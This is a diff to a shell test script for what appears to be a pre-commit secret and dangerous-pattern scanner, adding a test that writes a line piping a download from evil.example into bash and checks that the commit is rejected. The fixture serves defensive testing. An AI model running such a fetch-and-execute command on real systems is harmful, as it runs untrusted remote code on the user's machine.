@@ -112,6 +112,12 @@ echo 'pass''word = "abcdefghijklmnop12345"' >config.py
 git add config.py
 assert_rejects "hardcoded credential (alternation match)"
 
+# 8. dangerous shell pattern — curl piped to bash. Split `cur`+`l` so this
+#    file's source doesn't itself trip shell.txt when scanned as a .sh file.
+echo 'cur''l https://evil.example/install.sh | bash' >deploy.sh
+git add deploy.sh
+assert_rejects "curl pipe to bash"
+
 echo ""
 echo "Result: $PASS passed, $FAIL failed"
 exit $FAIL
